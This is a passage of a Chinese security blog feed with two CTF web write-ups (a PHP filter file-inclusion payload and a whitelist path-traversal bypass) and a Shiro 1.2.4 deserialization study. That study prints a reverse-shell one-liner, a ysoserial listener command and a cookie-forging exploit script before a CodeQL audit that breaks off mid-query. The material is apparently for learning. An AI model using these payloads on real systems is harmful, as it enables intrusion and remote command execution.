      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
      <tag>msf</tag>
      
      <tag>木马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] ACTF2020新生赛-Include</title>
    <link href="/2022/11/22/%5Bctf-web%5D%20ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/"/>
    <url>/2022/11/22/%5Bctf-web%5D%20ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/</url>
    
    <content type="html"><![CDATA[<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>进入是一个空页面，有个<code>tips</code>，点击进入新页面，URL中有<code>?file=</code>，所以应该需要文件包含，使用PHP伪协议读文件，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">242761</span>c4-<span class="hljs-number">5</span>d47-<span class="hljs-number">4</span>e08-b26b-f9d2e5aeb5ff.node4.buuoj.cn:<span class="hljs-number">81</span><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>解码后得到flag。</p><blockquote><p>文件是<code>flag.php</code>，开始尝试了<code>flag</code>和<code>../../../../flag</code>都没有成功，下次可以尝试爆破。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] HCTF2018-WarmUp</title>
    <link href="/2022/11/20/%5Bctf-web%5D%20HCTF2018-WarmUp/"/>
    <url>/2022/11/20/%5Bctf-web%5D%20HCTF2018-WarmUp/</url>
    
    <content type="html"><![CDATA[<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>进入后发现只是一个图片的页面，查看源代码发现新的页面<code>source.php</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120224637828.png" alt="image-20221120224637828"></p><p>进入后发现php代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现还有一个<code>hint.php</code>页面，进入后提示flag在<code>ffffllllaaaagggg</code>，</p><p>审计代码，需要参数<code>file</code>，函数<code>checkFile</code>对输入进行检测，定义了白名单，主要的检测函数有：</p><ul><li><code>mb_substr</code>：截取字符串</li><li><code>mb_strpos</code>：目标字符在字符串首次出现的位置</li><li><code>urldecode</code>：url解码</li></ul><p>要检测函数返回<code>true</code>有三种情况：</p><ol><li><p>参数在白名单中；</p></li><li><p>参数的开始到第一个<code>?</code>的子串在白名单中；</p></li><li><p>参数在url解码后，从开始到第一个<code>?</code>的字串在白名单中；</p></li></ol><p>所以可以构造这样的参数<code>file=source.php?../../../../../../../ffffllllaaaagggg</code>，不满足情况1，满足情况2；这样在<code>include</code>时会从文件<code>source.php</code>开始一直到最上层的<code>ffffllllaaaagggg</code>，得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[代码审计] shiro1.2.4反序列化漏洞源码解析及codeql审计</title>
    <link href="/2022/11/20/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8F%8Acodeql%E5%AE%A1%E8%AE%A1/"/>
    <url>/2022/11/20/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8F%8Acodeql%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="shiro1-2-4反序列化漏洞源码解析及codeql审计"><a href="#shiro1-2-4反序列化漏洞源码解析及codeql审计" class="headerlink" title="shiro1.2.4反序列化漏洞源码解析及codeql审计"></a>shiro1.2.4反序列化漏洞源码解析及codeql审计</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><blockquote><p>这篇文章的目的是：</p><ul><li>学习shiro反序列化漏洞</li><li>学习codeql分析过程</li></ul></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本来漏洞复现是准备在<code>vulhub</code>上做的，但是docker一直拉不了镜像，所以在<a href="https://vulfocus.cn/">vulfocus</a>上做了，但是觉得这个上面的环境一直不是很稳，总是出现无法访问的问题。</p><p>复现这个漏洞需要：</p><ul><li>用来反弹shell的VPS</li><li>java工具<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a></li><li>python</li></ul><p>启动<code>shiro 反序列化（CVE-2016-4437）</code>的环境，有个登录的功能（没截图），输入账号密码登录，需要点击<code>RememberMe</code>，抓包，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120211941945.png" alt="image-20221120211941945"></p><p>反弹shell的的指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/[攻击者IP]/[端口] 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>将其进行base64编码（假设为：XXXX），然后运行ysoserial工具：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp ysoserial-master-<span class="hljs-number">2874</span>a69f61-<span class="hljs-number">1</span>.jar ysoserial.exploit.JRMPListener <span class="hljs-number">6666</span> CommonsCollections4 <span class="hljs-string">&quot;bash -c &#123;echo,XXXX&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>运行后会显示<code>Opening JRMP listener on 6666</code>，</p><p>接着需要伪造cookie内容，使用python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">command</span>):<br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])   <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure><p>这样运行：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> shiro.<span class="hljs-keyword">py</span> 攻击和IP:监听端口<br></code></pre></td></tr></table></figure><p>会得到这样的结果，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rememberMe=<span class="hljs-number">6</span>pVbhZZ9RrCiwHtpZoCvgWiJFWv6pAWgY1iTpGc9Wf1rI1XiTiYGBgJa<span class="hljs-regexp">/vD1DRh7m1sy3PAICqd7mLXrYo4nP0hu/</span>M5V<span class="hljs-regexp">/RMXNoi7iU7YExP8r85f57W0tZHvlBauBxWGQ+QE9/</span>hvTIZ+Re<span class="hljs-regexp">/+kLDqj2vXKfmxZnte/</span>eVCdRC<span class="hljs-regexp">/69e0UXrkuyAsDy0rOE7bcitWxb0NQDreXe5e7hndz2Od+n1vFnH+Xq/</span>DIXzTy+bEZhm8QE0Lef<span class="hljs-regexp">/ZW2FL99Hp5USPnfnqKmrWSruGn1BLwSE1f6u88SUFDY+Entuamq2wU5yeITLFHUiUWYoZjjybdBXPWbbobnJPE0IxSAyqMXuLYk0OM3edozSan1E6LhowgD8/</span>dgGuEmRV0WizucNZXGGJTQS0QrWGIe3y+eKlD+qD1g==<br></code></pre></td></tr></table></figure><p>然后修改数据包的<code>Cookie</code>内容为生成的字符串，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120213427975.png" alt="image-20221120213427975"></p><p>发送数据包，就可以得到反弹的shell了。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>使用<code>shiro</code>登录时，会有<code>Remember me</code>功能，漏洞存在于该功能。环境搭建用了很长的时间，最后找到网上教程完成的。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211231730903.png" alt="image-20221211231730903"></p><p>这里登录要使用默认的账号密码，一开始随便写的怎么都不行，还以为又出问题了:cry:</p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>首先断点到了这里：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>表示登录成功了，继续跟进，来到<code>rememberMeSuccessfulLogin</code>，这里好像是判断是否选择了<code>Remember me</code>功能，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><p>会继续进入<code>AbstractRememberMeManager</code>的<code>onSuccessfulLogin</code>方法，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/%E5%9B%BE%E7%89%873.png" alt="图片3"></p><p>在这里<code>forgetIdentity(subject)</code>是清除之前的验证，往下跟进会进入<code>rememberIdentity</code>，这里的<code>PrincipalCollection</code>保存登录信息，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/%E5%9B%BE%E7%89%874.png" alt="图片4"></p><p>继续跟进，进入<code>rememberIdentity</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/%E5%9B%BE%E7%89%875.png" alt="图片5"></p><p>进入<code>convertPrincipalsToBytes</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/%E5%9B%BE%E7%89%876.png" alt="图片6"></p><p>到这里首先进行了序列化<code>serialize(principals)</code>，然后进入加密<code>encrypt()</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/%E5%9B%BE%E7%89%877.png" alt="图片7"></p><p>这里用到了key，通过方法<code>getEncryptionCipherKey()</code>，查找这个方法，最后得到了key，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211232953767.png" alt="image-20221211232953767"></p><p>然后继续跟进<code>encrypt()</code>方法，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221212215626283.png" alt="image-20221212215626283"></p><p>到<code>org/apache/shiro/crypto/JcaCipherService.java</code>中，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221212215723106.png" alt="image-20221212215723106"></p><p>这里传入的是序列化数组以及Key值，方法中会生成<code>ivBytes</code>，这里的<code>generate</code>的结果一直是<code>true</code>，跟进<code>generateInitializationVector</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221212220224517.png" alt="image-20221212220224517"></p><p>首先会生成<code>size</code>，这里是<code>128</code>，然后<code>BITS_PER_BYTE</code>是<code>8</code>，所以生成的<code>ivBytes</code>是<code>16</code>位的，通过<code>ensureSecureRandom()</code>方法生成随机值。回到<code>encrypt</code>，继续进入重载的<code>encrypt</code>方法，这里是具体的加密方法，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221212220754312.png" alt="image-20221212220754312"></p><p>加密之后，就会设置cookie，在方法<code>rememberSerializedIdentity</code>中，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/%E5%9B%BE%E7%89%878.png" alt="图片8"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/%E5%9B%BE%E7%89%879.png" alt="图片9"></p><p>生成的cooke为：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211233159416.png" alt="image-20221211233159416"></p><p>整体审计下来会发现最大的问题是加密的Key是固定值（这个在1.2.5修复使用随机值），如果拿到了rememberMe的值，就可以进行解密，再进行反序列化操作。</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>得到cookie的地方在这里：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/Snipaste_2022-12-26_21-06-35.png" alt="Snipaste_2022-12-26_21-06-35"></p><p>这里抓包有点问题，所以后面的一直没有成功，之后是到了<code>getRememberedPrincipals</code>这里：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226211844674.png" alt="image-20221226211844674"></p><p>然后进入到了<code>getRememberedSerializedIdentity</code>，以及<code>convertBytesToPrincipals</code>，跟踪到<code>convertBytesToPrincipals</code>中，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226212035334.png" alt="image-20221226212035334"></p><p>进入到<code>decrypt</code>中，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226212059197.png" alt="image-20221226212059197"></p><p>解密的步骤和加密的类似，不进一步进入了，不过这里解密后面返回的是序列化的，所以在<code>convertBytesToPrincipals</code>这里会进行反序列化，跟进<code>deserialize</code>方法，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226213307487.png" alt="image-20221226213307487"></p><p>继续：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226213612618.png" alt="image-20221226213612618"></p><p>这里最后进入<code>readObject</code>。</p><h2 id="codeql审计"><a href="#codeql审计" class="headerlink" title="codeql审计"></a>codeql审计</h2><p>由于codeql需要用maven编译，根据网上的方法，使用命令：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">CodeQL <span class="hljs-keyword">database</span> <span class="hljs-keyword">create</span> shiro1<span class="hljs-number">.2</span><span class="hljs-number">.4</span> –<span class="hljs-keyword">language</span>=java –overwrite –command=&quot;mvn package -Dmaven.test.skip&quot;<br></code></pre></td></tr></table></figure><p>但是没有成功，不断的出现错误，找了很多方法都没有成功。然后想到了vscode上的codeql插件好像可以直接下载数据库，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120162446837.png" alt="image-20221120162446837"></p><p>先找到shiro在Github上的地址：<a href="https://github.com/apache/shiro/tree/shiro-root-1.2.4">https://github.com/apache/shiro/tree/shiro-root-1.2.4</a></p><p>然后点击图种的按钮，输入这个地址，就会自动下载数据库了，真是太方便了！！！</p><hr><p>根据shiro反序列化的原理分析，可以知道在使用这个漏洞时主要还是构造cookie进入程序中进行解密、反序列化等一系列操作，所以根据上面解密的分析，source定义为<code>getCookies</code>，然后sink定义为<code>readObject</code>。</p><p>shiro的codeql代码参考的是网上的（网上应该都是一个版本），</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* @id java/examples/shiro</span><br><span class="hljs-comment">* @name shiro</span><br><span class="hljs-comment">* @description shiro</span><br><span class="hljs-comment">* @kind path-problem</span><br><span class="hljs-comment">* @problem.severity warning</span><br><span class="hljs-comment">*/</span><br><br>import java<br>import semmle.code.java.dataflow.FlowSources<br>import DataFlow::PathGraph<br><br><br>predicate is<span class="hljs-constructor">CookiegetValue(Expr <span class="hljs-params">expSrc</span>, Expr <span class="hljs-params">expDest</span>)</span> &#123;<br>    exists(Method <span class="hljs-keyword">method</span>, MethodAccess call<span class="hljs-pattern-match">|</span><br><span class="hljs-pattern-match">    exp<span class="hljs-constructor">Src</span>.get<span class="hljs-constructor">Type()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>=&quot;<span class="hljs-constructor">Cookie</span>&quot; <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    exp<span class="hljs-constructor">Dest</span>=call <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    call.get<span class="hljs-constructor">Method()</span> = <span class="hljs-keyword">method</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    <span class="hljs-keyword">method</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;getValue&quot;</span>)</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    <span class="hljs-keyword">method</span>.get<span class="hljs-constructor">DeclaringType()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span> = &quot;<span class="hljs-constructor">Cookie</span>&quot;</span><br><span class="hljs-pattern-match">    )</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">predicate is<span class="hljs-constructor">ReadObject(Expr <span class="hljs-params">expSrc</span>, Expr <span class="hljs-params">expDest</span>)</span> &#123;</span><br><span class="hljs-pattern-match">    exists(<span class="hljs-constructor">Method</span> <span class="hljs-keyword">method</span>, <span class="hljs-constructor">MethodAccess</span> call|</span><br><span class="hljs-pattern-match">    exp<span class="hljs-constructor">Src</span>.get<span class="hljs-constructor">Type()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>=&quot;<span class="hljs-constructor">ObjectInputStream</span>&quot; <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    exp<span class="hljs-constructor">Dest</span>=call <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    call.get<span class="hljs-constructor">Method()</span> = <span class="hljs-keyword">method</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    <span class="hljs-keyword">method</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;readObject&quot;</span>)</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    <span class="hljs-keyword">method</span>.get<span class="hljs-constructor">DeclaringType()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span> = &quot;<span class="hljs-constructor">ObjectInputStream</span>&quot;</span><br><span class="hljs-pattern-match">    )</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">predicate is<span class="hljs-constructor">Base64(Expr <span class="hljs-params">expSrc</span>, Expr <span class="hljs-params">expDest</span>)</span> &#123;</span><br><span class="hljs-pattern-match">    exists(<span class="hljs-constructor">Method</span> <span class="hljs-keyword">method</span>, <span class="hljs-constructor">MethodAccess</span> call|</span><br><span class="hljs-pattern-match">    exp<span class="hljs-constructor">Src</span>.get<span class="hljs-constructor">Type()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>=&quot;<span class="hljs-constructor">String</span>&quot; <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    exp<span class="hljs-constructor">Dest</span>=call <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    call.get<span class="hljs-constructor">Method()</span> = <span class="hljs-keyword">method</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    <span class="hljs-keyword">method</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;decode&quot;</span>)</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    <span class="hljs-keyword">method</span>.get<span class="hljs-constructor">DeclaringType()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span> = &quot;<span class="hljs-constructor">Base64</span>&quot;</span><br><span class="hljs-pattern-match">    )</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">predicate isdecrypt(<span class="hljs-constructor">Expr</span> exp<span class="hljs-constructor">Src</span>, <span class="hljs-constructor">Expr</span> exp<span class="hljs-constructor">Dest</span>) &#123;</span><br><span class="hljs-pattern-match">    exists(<span class="hljs-constructor">Method</span> <span class="hljs-keyword">method</span>, <span class="hljs-constructor">MethodAccess</span> call|</span><br><span class="hljs-pattern-match">    exp<span class="hljs-constructor">Src</span>.get<span 